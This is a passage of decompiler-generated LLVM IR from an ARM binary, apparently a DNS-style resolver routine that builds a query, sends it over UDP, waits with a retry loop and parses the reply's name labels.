.thread133:                                       ; preds = %dec_label_pc_1bad4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c238

dec_label_pc_1bb28:                               ; preds = %dec_label_pc_1bad4
  %v1_1bb2c = add i32 %v0_1bafc, 130
  %v1_1bb30 = call i32 @function_14ccc(i32 %v1_1bb2c)
  store i32 %v1_1bb30, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1bb34 = icmp eq i32 %v1_1bb30, 0
  br i1 %v2_1bb34, label %.thread6, label %bb

bb:                                               ; preds = %dec_label_pc_1bb28
  %v1_1bb38 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1bb38 = icmp eq i32 %v1_1bb38, 0
  br i1 %v3_1bb38, label %bb214, label %dec_label_pc_1bb4c

.thread6:                                         ; preds = %dec_label_pc_1bb28
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1c230

bb214:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1c230

dec_label_pc_1bb4c:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_1bb4c = load i32, i32* @r4, align 4
  %v1_1bb4c = inttoptr i32 %v0_1bb4c to i8*
  %v2_1bb4c = load i8, i8* %v1_1bb4c, align 1
  %v3_1bb4c = zext i8 %v2_1bb4c to i32
  store i32 %v3_1bb4c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1bb50 = icmp eq i8 %v2_1bb4c, 0
  br i1 %v2_1bb50, label %dec_label_pc_1c230, label %dec_label_pc_1bb58

dec_label_pc_1bb58:                               ; preds = %dec_label_pc_1bb4c
  %v2_1bb5c = add i32 %v0_1bb4c, %v0_1bafc
  store i32 %v2_1bb5c, i32* %r3.global-to-local, align 4
  %v1_1bb60 = add i32 %v2_1bb5c, -1
  %v2_1bb60 = inttoptr i32 %v1_1bb60 to i8*
  %v3_1bb60 = load i8, i8* %v2_1bb60, align 1
  %v4_1bb60 = zext i8 %v3_1bb60 to i32
  store i32 %v4_1bb60, i32* @r3, align 4
  store i32 %v0_1bafc, i32* @r2, align 4
  store i32 %v0_1bb4c, i32* @r1, align 4
  %v0_1bb70 = call i32 @function_14000()
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 28340, i32* %ip.global-to-local, align 4
  store i32 27304, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @sb, align 4
  %v2_1bbec = ptrtoint i32* %stack_var_-76 to i32
  %v2_1bd04 = ptrtoint i16* %stack_var_-104 to i32
  %v15_1bd08 = ptrtoint i32* %stack_var_-88 to i32
  %v2_1bd2c = ptrtoint i32* %stack_var_-192 to i32
  %v2_1bd4c = bitcast i32* %stack_var_-192 to i8*
  %v2_1be00 = ptrtoint i32* %stack_var_-48 to i32
  %v2_1be0c = ptrtoint i32* %stack_var_-56 to i32
  %v2_1be98 = icmp eq i32 %tmp162, 0
  %v1_1bea4 = add i32 %tmp161, -2
  %v2_1bea8 = icmp ne i32 %v1_1bea4, 0
  %tmp215 = icmp slt i32 %tmp160, 1
  %v2_1bf94 = ptrtoint i32* %stack_var_-448 to i32
  %v2_1bf98 = ptrtoint i32* %stack_var_-144 to i32
  %v5_1c1dc57 = icmp sgt i32 %tmp160, 0
  %v2_1c104 = icmp ne i32 %v0_1bae8, 0
  %v7_1c104 = icmp eq i32 %v0_1bae8, 1
  %v2_1c0ac = icmp eq i32 %tmp145, 0
  %v2_1beb4 = icmp ugt i8 %v3_1bb60, 45
  %v7_1beb4 = icmp eq i8 %v3_1bb60, 46
  %v1_1bc60 = add i32 %v1_1bb30, 1
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_1bc40 = add i32 %v1_1bb30, %v0_1bafc
  %v5_1bc40 = inttoptr i32 %v4_1bc40 to i8*
  %v1_1bea4.cmp = icmp ugt i32 %v1_1bea4, 1
  %v2_1bedc = icmp eq i32 %tmp161, 0
  %v3_1c108 = icmp ugt i32 %v0_1bae8, 27
  %v8_1c108 = icmp eq i32 %v0_1bae8, 28
  br label %dec_label_pc_1bbd0

dec_label_pc_1bbd0:                               ; preds = %dec_label_pc_1c218, %dec_label_pc_1bb58
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_1bb58 ], [ %v1_1c21c, %dec_label_pc_1c218 ]
  %stack_var_-464.0 = phi i32 [ %tmp173, %dec_label_pc_1bb58 ], [ %v3_1bce4, %dec_label_pc_1c218 ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_1bb58 ], [ %stack_var_-468.2, %dec_label_pc_1c218 ]
  %v1_1bbd8 = phi i32 [ -1, %dec_label_pc_1bb58 ], [ %v3_1bdb8, %dec_label_pc_1c218 ]
  store i32 %v1_1bbd8, i32* %r3.global-to-local, align 4
  %v2_1bbd4 = icmp eq i32 %v1_1bbd8, -1
  store i1 %v2_1bbd4, i1* %cpsr_c.global-to-local, align 1
  %v7_1bbd4 = icmp eq i32 %v1_1bbd8, -1
  br i1 %v7_1bbd4, label %bb217, label %bb216

bb216:                                            ; preds = %dec_label_pc_1bbd0
  br label %bb217

bb217:                                            ; preds = %dec_label_pc_1bbd0, %bb216
  %v1_1bbdc = xor i1 %v7_1bbd4, true
  call void @__pseudo_cond_branch(i1 %v1_1bbdc, i32 ptrtoint (i32* @global_var_12a98.1100 to i32))
  store i32 36, i32* @r7, align 4
  %v0_1bbe8 = load i32, i32* @r8, align 4
  %v2_1bbe8 = add i32 %v0_1bbe8, 40
  %v3_1bbe8 = inttoptr i32 %v2_1bbe8 to i32*
  %v4_1bbe8 = load i32, i32* %v3_1bbe8, align 4
  store i32 %v4_1bbe8, i32* @r4, align 4
  store i32 %v2_1bbec, i32* @r5, align 4
  store i32 76, i32* %ip.global-to-local, align 4
  %v2_1bbf8 = add i32 %v0_1bbe8, 36
  %v3_1bbf8 = inttoptr i32 %v2_1bbf8 to i32*
  %v4_1bbf8 = load i32, i32* %v3_1bbf8, align 4
  store i32 %v4_1bbf8, i32* %r1.global-to-local, align 4
  %v2_1bc00 = add i32 %v0_1bbe8, 76
  %v3_1bc00 = inttoptr i32 %v2_1bc00 to i32*
  %v4_1bc00 = load i32, i32* %v3_1bc00, align 4
  store i32 %v4_1bc00, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1bc00)
  store i32 16, i32* %r1.global-to-local, align 4
  %v0_1bc14 = load i32, i32* @r8, align 4
  %v2_1bc14 = add i32 %v0_1bc14, 16
  %v3_1bc14 = inttoptr i32 %v2_1bc14 to i32*
  %v4_1bc14 = load i32, i32* %v3_1bc14, align 4
  store i32 %v4_1bc14, i32* %ip.global-to-local, align 4
  store i32 113696, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1bc14)
  %v0_1bc20 = call i32 @function_1c368()
  %v4_1bc28 = load i8, i8* @global_var_32ee4.1101, align 1
  %v5_1bc28 = sext i8 %v4_1bc28 to i32
  store i32 %v1_1bb30, i32* %r3.global-to-local, align 4
  store i32 %v0_1bafc, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_1bc38 = load i32, i32* @sb, align 4
  %v3_1bc38 = icmp uge i32 %v0_1bc38, %v5_1bc28
  store i1 %v3_1bc38, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_1bc40, align 1
  %v0_1bc44 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1bc44, label %dec_label_pc_1bc70, label %dec_label_pc_1bc48

dec_label_pc_1bc48:                               ; preds = %bb217
  %v3_1bc50 = load i32, i32* %ip.global-to-local, align 4
  %v4_1bc50 = add i32 %v3_1bc50, %v1_1bb30
  %v5_1bc50 = inttoptr i32 %v4_1bc50 to i8*
  store i8 46, i8* %v5_1bc50, align 1
  store i32 28340, i32* %r1.global-to-local, align 4
  %v4_1bc5c = load i8, i8* @global_var_32ed8.1102, align 1
  %v5_1bc5c = sext i8 %v4_1bc5c to i32
  store i32 %v5_1bc5c, i32* %r3.global-to-local, align 4
  %v1_1bc64 = load i32, i32* %ip.global-to-local, align 4
  %v2_1bc64 = add i32 %v1_1bc60, %v1_1bc64
  %v1_1bc68 = load i32, i32* @sb, align 4
  %v2_1bc68 = and i32 %v1_1bc68, 1073741824
  %v3_1bc68 = icmp ne i32 %v2_1bc68, 0
  store i1 %v3_1bc68, i1* %cpsr_c.global-to-local, align 1
  %v4_1bc68 = mul i32 %v1_1bc68, 4
  %v5_1bc68 = add i32 %v4_1bc68, %v5_1bc5c
  %v6_1bc68 = inttoptr i32 %v5_1bc68 to i32*
  %v7_1bc68 = load i32, i32* %v6_1bc68, align 4
  store i32 %v7_1bc68, i32* @r1, align 4
  %v2_1bc6c = inttoptr i32 %v2_1bc64 to i8*
  %v3_1bc6c = call i32 @function_14210(i8* %v2_1bc6c, i32 %v7_1bc68)
  br label %dec_label_pc_1bc70

dec_label_pc_1bc70:                               ; preds = %bb217, %dec_label_pc_1bc48
  store i32 %stack_var_-468.0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1bc74 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_1bc74, label %dec_label_pc_1bc7c, label %dec_label_pc_1bc70.dec_label_pc_1bcac_crit_edge

dec_label_pc_1bc70.dec_label_pc_1bcac_crit_edge:  ; preds = %dec_label_pc_1bc70
  %v4_1bcb4.pre = load i32, i32* @global_var_32ee0.1105, align 4
  br label %dec_label_pc_1bcac

dec_label_pc_1bc7c:                               ; preds = %dec_label_pc_1bc70
  store i32 28348, i32* %r3.global-to-local, align 4
  store i32 2123, i32* %ip.global-to-local, align 4
  %v4_1bc84 = load i32, i32* @global_var_32ee0.1105, align 4
  %v0_1bc88 = load i32, i32* @r8, align 4
  %v2_1bc88 = add i32 %v0_1bc88, 2123
  %v3_1bc88 = inttoptr i32 %v2_1bc88 to i8*
  %v4_1bc88 = load i8, i8* %v3_1bc88, align 1
  %v6_1bc88 = zext i8 %v4_1bc88 to i32
  %v2_1bc8c = mul i32 %v6_1bc88, %v4_1bc84
  store i32 %v2_1bc8c, i32* %r3.global-to-local, align 4
  store i32 27304, i32* %r1.global-to-local, align 4
  %v2_1bc98 = add i32 %v0_1bc88, 2120
  %v3_1bc98 = inttoptr i32 %v2_1bc98 to i16*
  %v4_1bc98 = load i16, i16* %v3_1bc98, align 2
  %v6_1bc98 = zext i16 %v4_1bc98 to i32
  %v4_1bc9c = load i32, i32* @global_var_32acc.1103, align 4
  store i32 %v4_1bc9c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1bcac

dec_label_pc_1bcac:                               ; preds = %dec_label_pc_1bc70.dec_label_pc_1bcac_crit_edge, %dec_label_pc_1bc7c
  %v4_1bcb4 = phi i32 [ %v4_1bc84, %dec_label_pc_1bc7c ], [ %v4_1bcb4.pre, %dec_label_pc_1bc70.dec_label_pc_1bcac_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_1bc98, %dec_label_pc_1bc7c ], [ %stack_var_-464.0, %dec_label_pc_1bc70.dec_label_pc_1bcac_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_1bc9c, %dec_label_pc_1bc7c ], [ %stack_var_-468.0, %dec_label_pc_1bc70.dec_label_pc_1bcac_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_1bc8c, %dec_label_pc_1bc7c ], [ %stack_var_-476.0, %dec_label_pc_1bc70.dec_label_pc_1bcac_crit_edge ]
  store i32 %stack_var_-468.1, i32* %ip.global-to-local, align 4
  %v3_1bcbc = icmp uge i32 %stack_var_-468.1, %v4_1bcb4
  store i1 %v3_1bcbc, i1* %cpsr_c.global-to-local, align 1
  %v4_1bcc0 = load i32, i32* @global_var_32edc.1107, align 4
  store i32 %v4_1bcc0, i32* %r3.global-to-local, align 4
  br i1 %v3_1bcbc, label %bb218, label %bb219

bb218:                                            ; preds = %dec_label_pc_1bcac
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb219

bb219:                                            ; preds = %dec_label_pc_1bcac, %bb218
  %v0_1bccc = phi i32 [ %stack_var_-468.1, %dec_label_pc_1bcac ], [ 0, %bb218 ]
  %v3_1bccc = mul i32 %v0_1bccc, 28
  %v4_1bccc = add i32 %v3_1bccc, %v4_1bcc0
  store i32 %v4_1bccc, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-464.1, i32* %ip.global-to-local, align 4
  %v1_1bcd8 = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_1bce4 = urem i32 %v1_1bcd8, 65536
  store i32 27304, i32* %r1.global-to-local, align 4
  %v1_1bcf0 = trunc i32 %v1_1bcd8 to i16
  %v2_1bcf0 = load i32, i32* @r8, align 4
  %v4_1bcf0 = add i32 %v2_1bcf0, 2120
  %v5_1bcf0 = inttoptr i32 %v4_1bcf0 to i16*
  store i16 %v1_1bcf0, i16* %v5_1bcf0, align 2
  store i32 %v0_1bccc, i32* @global_var_32acc.1103, align 4
  %v0_1bcfc = load i32, i32* %r3.global-to-local, align 4
  %v1_1bd00 = inttoptr i32 %v0_1bcfc to i32*
  %v2_1bd00 = load i32, i32* %v1_1bd00, align 4
  %v3_1bd00 = add i32 %v0_1bcfc, 4
  %v4_1bd00 = inttoptr i32 %v3_1bd00 to i32*
  %v5_1bd00 = load i32, i32* %v4_1bd00, align 4
  store i32 %v5_1bd00, i32* %r1.global-to-local, align 4
  %v9_1bd00 = add i32 %v0_1bcfc, 12
  %v10_1bd00 = inttoptr i32 %v9_1bd00 to i32*
  %v11_1bd00 = load i32, i32* %v10_1bd00, align 4
  store i32 %v11_1bd00, i32* %r3.global-to-local, align 4
  %v12_1bd00 = add i32 %v0_1bcfc, 16
  %v4_1bd08 = trunc i32 %v2_1bd00 to i16
  store i16 %v4_1bd08, i16* %stack_var_-104, align 2
  store i32 %v15_1bd08, i32* %ip.global-to-local, align 4
  %v1_1bd0c = inttoptr i32 %v12_1bd00 to i32*
  %v2_1bd0c = load i32, i32* %v1_1bd0c, align 4
  %v3_1bd0c = add i32 %v0_1bcfc, 20
  %v4_1bd0c = inttoptr i32 %v3_1bd0c to i32*
  %v5_1bd0c = load i32, i32* %v4_1bd0c, align 4
  store i32 %v5_1bd0c, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 %v2_1bd0c, i32* %stack_var_-88, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_1bd20 = load i32, i32* @r8, align 4
  %v2_1bd20 = add i32 %v0_1bd20, 24
  %v3_1bd20 = inttoptr i32 %v2_1bd20 to i32*
  %v4_1bd20 = load i32, i32* %v3_1bd20, align 4
  store i32 %v4_1bd20, i32* %ip.global-to-local, align 4
  store i32 113964, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1bd20)
  store i32 %v2_1bd2c, i32* @r6, align 4
  %v0_1bd30 = load i32, i32* @r7, align 4
  store i32 %v0_1bd30, i32* %r1.global-to-local, align 4
  store i32 512, i32* @r2, align 4
  %v0_1bd38 = load i32, i32* @sl, align 4
  %v2_1bd3c = inttoptr i32 %v0_1bd38 to i8*
  %v3_1bd3c = call i32 @function_13ed0(i8* %v2_1bd3c, i32 %v0_1bd30)
  %v0_1bd40 = load i32, i32* @r7, align 4
  store i32 %v0_1bd40, i32* %r1.global-to-local, align 4
  store i32 48, i32* @r2, align 4
  %v3_1bd4c = call i32 @function_13ed0(i8* %v2_1bd4c, i32 %v0_1bd40)
  store i32 %v3_1bce4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_1bd5c = load i32, i32* @sl, align 4
  store i32 %v0_1bd5c, i32* %r1.global-to-local, align 4
  store i32 %v3_1bce4, i32* %stack_var_-192, align 4
  %v6_1bd70 = call i32 @function_1cd54(i32* nonnull %stack_var_-192, i32 %v0_1bd5c, i32 512, i32 %v3_1bce4, i32 %v3_1bce4)
  store i32 %v6_1bd70, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1bd74 = icmp slt i32 %v6_1bd70, 0
  br i1 %v1_1bd74, label %dec_label_pc_1c230, label %dec_label_pc_1bd7c

dec_label_pc_1bd7c:                               ; preds = %bb219
  store i32 %v0_1bae8, i32* @ip, align 4
  store i32 %v1_1bb30, i32* @r5, align 4
  %v0_1bd8c = load i32, i32* @sl, align 4
  %v2_1bd8c = add i32 %v0_1bd8c, %v6_1bd70
  store i32 %v2_1bd8c, i32* %r1.global-to-local, align 4
  %v1_1bd90 = sub i32 512, %v6_1bd70
  store i32 %v1_1bb30, i32* %stack_var_-60, align 4
  store i32 %v0_1bae8, i32* %stack_var_-56, align 4
  %v4_1bd9c = call i32 @function_1cef4(i32* nonnull %stack_var_-60, i32 %v2_1bd8c, i32 %v1_1bd90)
  store i32 %v4_1bd9c, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1bda0 = icmp slt i32 %v4_1bd9c, 0
  br i1 %v1_1bda0, label %dec_label_pc_1c230, label %dec_label_pc_1bda8

dec_label_pc_1bda8:                               ; preds = %dec_label_pc_1bd7c
  %v3_1bdac = load i16, i16* %stack_var_-104, align 2
  %v4_1bdac = sext i16 %v3_1bdac to i32
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_1bdb8 = call i32 @function_14a84(i32 %v4_1bdac, i32 2, i32 17)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1bdbc = icmp slt i32 %v3_1bdb8, 0
  br i1 %v1_1bdbc, label %dec_label_pc_1c208, label %dec_label_pc_1bdc8

dec_label_pc_1bdc8:                               ; preds = %dec_label_pc_1bda8
  store i32 %v2_1bd04, i32* %r1.global-to-local, align 4
  %v3_1bdd0 = call i32 @function_148dc(i32 %v3_1bdb8, i32 %v2_1bd04, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1bdd4 = icmp slt i32 %v3_1bdd0, 0
  br i1 %v1_1bdd4, label %dec_label_pc_1c208, label %dec_label_pc_1bddc

dec_label_pc_1bddc:                               ; preds = %dec_label_pc_1bdc8
  %v0_1bddc = load i32, i32* @r5, align 4
  %v1_1bddc = load i32, i32* @r4, align 4
  %v2_1bddc = add i32 %v1_1bddc, %v0_1bddc
  %v0_1bde0 = load i32, i32* @r7, align 4
  store i32 %v0_1bde0, i32* %r3.global-to-local, align 4
  %v0_1bde8 = load i32, i32* @sl, align 4
  store i32 %v0_1bde8, i32* %r1.global-to-local, align 4
  %v4_1bdec = call i32 @function_149c8(i32 %v3_1bdb8, i32 %v0_1bde8, i32 %v2_1bddc, i32 %v0_1bde0)
  store i32 2122, i32* %r3.global-to-local, align 4
  %v0_1bdf4 = load i32, i32* @r8, align 4
  %v2_1bdf4 = add i32 %v0_1bdf4, 2122
  %v3_1bdf4 = inttoptr i32 %v2_1bdf4 to i8*
  %v4_1bdf4 = load i8, i8* %v3_1bdf4, align 1
  %v6_1bdf4 = zext i8 %v4_1bdf4 to i32
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_1bdfc = mul nuw nsw i32 %v6_1bdf4, 1000
  store i32 %v2_1bdfc, i32* @r4, align 4
  store i32 %v2_1be00, i32* @r5, align 4
  br label %dec_label_pc_1be04

dec_label_pc_1be04:                               ; preds = %thread-pre-split, %dec_label_pc_1bddc
  %v0_1be10 = phi i32 [ %v1_1be50, %thread-pre-split ], [ %v2_1bdfc, %dec_label_pc_1bddc ]
  store i32 %v3_1bdb8, i32* %r3.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 %v2_1be0c, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v3_1bdb8, i32* %stack_var_-48, align 4
  %v7_1be24 = call i32 @function_1cba0(i32 %v2_1be00, i32 1, i32 %v0_1be10, i32 %v3_1bdb8, i32 %v3_1bdb8, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_1be2c = load i32, i32* @sl, align 4
  store i32 %v0_1be2c, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp220 = icmp slt i32 %v7_1be24, 1
  br i1 %tmp220, label %dec_label_pc_1c208, label %dec_label_pc_1be40

dec_label_pc_1be40:                               ; preds = %dec_label_pc_1be04
  %v4_1be40 = call i32 @function_14990(i32 %v3_1bdb8, i32 %v0_1be2c, i32 512, i32 64)
  %v2_1be44 = icmp ugt i32 %v4_1be40, 10
  store i1 %v2_1be44, i1* %cpsr_c.global-to-local, align 1
  %v8_1be4c = icmp sgt i32 %v4_1be40, 11
  br i1 %v8_1be4c, label %dec_label_pc_1be78, label %dec_label_pc_1be50

dec_label_pc_1be50:                               ; preds = %dec_label_pc_1be78, %dec_label_pc_1be94, %dec_label_pc_1be40
  %v0_1be50 = load i32, i32* @r4, align 4
  %v1_1be50 = add i32 %v0_1be50, -1000
  store i32 %v1_1be50, i32* @r4, align 4
  %v7_1be50 = icmp eq i32 %v0_1be50, 1000
  %tmp284 = zext i1 %v7_1be50 to i32
  %. = xor i32 %tmp284, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1be60 = icmp slt i32 %v4_1be40, 0
  br i1 %v1_1be60, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_1be50
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1c208

thread-pre-split:                                 ; preds = %dec_label_pc_1be50
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1be50, label %dec_label_pc_1c208, label %dec_label_pc_1be04

dec_label_pc_1be78:                               ; preds = %dec_label_pc_1be40
  store i32 %v2_1bd2c, i32* %r1.global-to-local, align 4
  %v0_1be7c = load i32, i32* @sl, align 4
  %v2_1be80 = inttoptr i32 %v0_1be7c to i8*
  %v3_1be80 = call i32 @function_1ce40(i8* %v2_1be80, i32 %v2_1bd2c)
  %v3_1be84 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_1be84, i32* %r3.global-to-local, align 4
  store i32 %v3_1bce4, i32* %r1.global-to-local, align 4
  %v3_1be8c = icmp uge i32 %v3_1be84, %v3_1bce4
  store i1 %v3_1be8c, i1* %cpsr_c.global-to-local, align 1
  %v9_1be8c = icmp eq i32 %v3_1be84, %v3_1bce4
  br i1 %v9_1be8c, label %dec_label_pc_1be94, label %dec_label_pc_1be50

dec_label_pc_1be94:                               ; preds = %dec_label_pc_1be78
  store i32 %tmp162, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1be98, label %dec_label_pc_1be50, label %dec_label_pc_1bea0

dec_label_pc_1bea0:                               ; preds = %dec_label_pc_1be94
  store i32 %v1_1bea4, i32* %r3.global-to-local, align 4
  store i1 %v2_1bea8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_1bea4.cmp, label %dec_label_pc_1bedc, label %dec_label_pc_1beb0

dec_label_pc_1beb0:                               ; preds = %dec_label_pc_1bea0
  store i1 %v2_1beb4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1beb4, label %dec_label_pc_1bed0, label %dec_label_pc_1bebc

dec_label_pc_1bebc:                               ; preds = %dec_label_pc_1beb0
  store i32 %v5_1bc28, i32* @r5, align 4
  %v1_1bec0 = add nsw i32 %v5_1bc28, -1
  store i32 %v1_1bec0, i32* %r3.global-to-local, align 4
  %v0_1bec4 = load i32, i32* @sb, align 4
  %v3_1bec4 = icmp uge i32 %v0_1bec4, %v1_1bec0
  store i1 %v3_1bec4, i1* %cpsr_c.global-to-local, align 1
  %v5_1bec8 = icmp slt i32 %v0_1bec4, %v1_1bec0
  br i1 %v5_1bec8, label %.thread8, label %dec_label_pc_1bed0

.thread8:                                         ; preds = %dec_label_pc_1bebc
  %v7_1bec8 = add i32 %v0_1bec4, 1
  br label %dec_label_pc_1c218

dec_label_pc_1bed0:                               ; preds = %dec_label_pc_1bebc, %dec_label_pc_1beb0
  %v0_1bed0 = call i32 @function_17a38()
  br label %dec_label_pc_1bf04

dec_label_pc_1bedc:                               ; preds = %dec_label_pc_1bea0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1bedc, label %dec_label_pc_1bee4, label %dec_label_pc_1c208

dec_label_pc_1bee4:                               ; preds = %dec_label_pc_1bedc
  store i32 %tmp160, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp215, label %dec_label_pc_1befc, label %dec_label_pc_1bf0c

dec_label_pc_1befc:                               ; preds = %dec_label_pc_1bee4
  %v0_1befc = call i32 @function_17a38()
  br label %dec_label_pc_1bf04

dec_label_pc_1bf04:                               ; preds = %dec_label_pc_1bed0, %dec_label_pc_1befc
  %storemerge2 = phi i32 [ %v0_1befc, %dec_label_pc_1befc ], [ %v0_1bed0, %dec_label_pc_1bed0 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1befc ], [ 1, %dec_label_pc_1bed0 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_1bf04 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_1bf04, align 4
  br label %dec_label_pc_1c250

dec_label_pc_1bf0c:                               ; preds = %dec_label_pc_1bee4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_1bf10.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @ip, align 4
  %v2_1bf10 = add i32 %v0_1bf10.pre, 12
  store i32 %v2_1bf10, i32* @r4, align 4
  %v3_1bf10 = icmp ugt i32 %v0_1bf10.pre, -13
  store i1 %v3_1bf10, i1* %cpsr_c.global-to-local, align 1
  %v9_1bf10 = icmp eq i32 %v2_1bf10, 0
  br i1 %v9_1bf10, label %dec_label_pc_1c208, label %dec_label_pc_1bf18

dec_label_pc_1bf18:                               ; preds = %dec_label_pc_1bf0c
  %v2_1bf1c = add i32 %v4_1be40, -12
  store i32 %v2_1bf1c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp224 = icmp slt i32 %v2_1bf1c, 1
  br i1 %tmp224, label %dec_label_pc_1c208, label %dec_label_pc_1bf2c

dec_label_pc_1bf24thread-pre-split:               ; preds = %dec_label_pc_1bf48
  %v2_1bf5416 = add i32 %v2_1bf38, -1
  store i32 %v2_1bf5416, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp225 = icmp slt i32 %v2_1bf5416, 1
  br i1 %tmp225, label %dec_label_pc_1c208, label %dec_label_pc_1bf2c

dec_label_pc_1bf2c:                               ; preds = %dec_label_pc_1bf18, %dec_label_pc_1bf24thread-pre-split
  %v1_1bf50 = phi i32 [ %v2_1bf5416, %dec_label_pc_1bf24thread-pre-split ], [ %v2_1bf1c, %dec_label_pc_1bf18 ]
  %v0_1bf2c = phi i32 [ %v2_1bf40, %dec_label_pc_1bf24thread-pre-split ], [ %v2_1bf10, %dec_label_pc_1bf18 ]
  %v1_1bf2c = inttoptr i32 %v0_1bf2c to i8*
  %v2_1bf2c = load i8, i8* %v1_1bf2c, align 1
  %v3_1bf2c = zext i8 %v2_1bf2c to i32
  store i32 %v3_1bf2c, i32* %r3.global-to-local, align 4
  %v5_1bf2c = add i32 %v0_1bf2c, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1bf30 = icmp eq i8 %v2_1bf2c, 0
  %v2_1bf38 = sub i32 %v1_1bf50, %v3_1bf2c
  store i32 %v2_1bf38, i32* @lr, align 4
  %v1_1bf3c = and i32 %v3_1bf2c, 192
  store i32 %v1_1bf3c, i32* @ip, align 4
  %v2_1bf40 = add i32 %v3_1bf2c, %v5_1bf2c
  br i1 %v2_1bf30, label %dec_label_pc_1bf5c, label %dec_label_pc_1bf48

dec_label_pc_1bf48:                               ; preds = %dec_label_pc_1bf2c
  %v2_1bf48 = icmp eq i32 %v1_1bf3c, 192
  store i1 %v2_1bf48, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1bf48, label %.thread10, label %dec_label_pc_1bf24thread-pre-split

.thread10:                                        ; preds = %dec_label_pc_1bf48
  %v2_1bf4c = add i32 %v0_1bf2c, 2
  %v2_1bf50 = add i32 %v1_1bf50, -2
  store i32 %v2_1bf50, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1bf5c

dec_label_pc_1bf5c:                               ; preds = %dec_label_pc_1bf2c, %.thread10
  %v1_1bf68 = phi i32 [ %v2_1bf4c, %.thread10 ], [ %v5_1bf2c, %dec_label_pc_1bf2c ]
  %v0_1bf5c = phi i32 [ %v2_1bf50, %.thread10 ], [ %v1_1bf50, %dec_label_pc_1bf2c ]
  %v1_1bf5c = add i32 %v0_1bf5c, -3
  %v2_1bf5c = icmp ugt i32 %v0_1bf5c, 2
  store i1 %v2_1bf5c, i1* %cpsr_c.global-to-local, align 1
  %v3_1bf5c = sub i32 2, %v0_1bf5c
  %v4_1bf5c = and i32 %v3_1bf5c, %v0_1bf5c
  %v5_1bf5c = icmp slt i32 %v4_1bf5c, 0
  %v6_1bf5c = icmp slt i32 %v1_1bf5c, 0
  %v7_1bf5c = icmp eq i32 %v0_1bf5c, 3
  %v3_1bf60 = xor i1 %v6_1bf5c, %v5_1bf5c
  %v4_1bf60 = or i1 %v7_1bf5c, %v3_1bf60
  br i1 %v4_1bf60, label %dec_label_pc_1c208, label %dec_label_pc_1bf64

dec_label_pc_1bf64:                               ; preds = %dec_label_pc_1bf5c
